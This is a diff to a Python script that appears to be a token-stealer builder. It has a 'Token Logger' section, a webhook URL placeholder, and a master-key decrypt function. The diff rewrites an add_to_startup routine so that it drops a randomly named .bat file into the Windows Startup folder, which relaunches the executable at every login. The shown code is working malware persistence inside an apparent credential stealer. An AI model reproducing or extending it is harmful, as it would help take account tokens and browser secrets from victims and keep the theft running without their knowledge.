@@ -19,24 +19,42 @@ import subprocess
 import pyautogui
 from io import BytesIO
 import getpass
+import sys
 
 webhook_url = "{webhook_placeholder}"
+startup_add = "{startup_placeholder}"
 
 ## Token Logger
 tokens = []
 cleaned = []
 checker = []
 
+import os
+import getpass
+import sys
+
 def add_to_startup():
-    try:
-        USER_NAME = getpass.getuser()
-        file_path = os.path.dirname(os.path.realpath(__file__))
-        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
-        with open(bat_path + '\\' + "startup.bat", "w+") as bat_file:
-            bat_file.write(r'start "" "%s"' % file_path)
-        return "Sucessfully added to startup!"
-    except Exception as e:
-        return e
+    if startup_add:
+        try:
+            USER_NAME = getpass.getuser()
+            file_path = sys.executable  
+            bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
+
+            file_name = "co2Kuu7ciLCO4zhChB0V.bat"
+            file_to_create = os.path.join(bat_path, file_name)
+            if not os.path.exists(file_to_create):
+                with open(file_to_create, "w+") as bat_file:
+                    bat_file.write(r'start "" "%s"' % file_path)
+                return "Successfully added to startup!"
+            else:
+                return "File already exists in the Startup folder."
+
+        except Exception as e:
+            return e
+    else:
+        return "Add to startup not enabled."
+
+
 
 def decrypt(buff, master_key):
     try:
